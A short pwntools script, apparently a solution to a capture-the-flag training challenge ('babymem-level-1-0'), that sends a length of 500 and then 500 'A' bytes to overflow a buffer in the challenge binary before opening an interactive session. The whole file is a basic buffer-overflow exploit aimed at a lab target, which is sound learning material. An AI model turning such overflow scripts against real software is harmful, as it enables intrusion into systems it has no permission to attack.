from pwn import *

elf = ELF("/challenge/babymem-level-1-0")
p = elf.process()

# Dimensione della linea
p.sendline(b"500")
payload = b"A"*500
p.sendline(payload)

p.interactive()
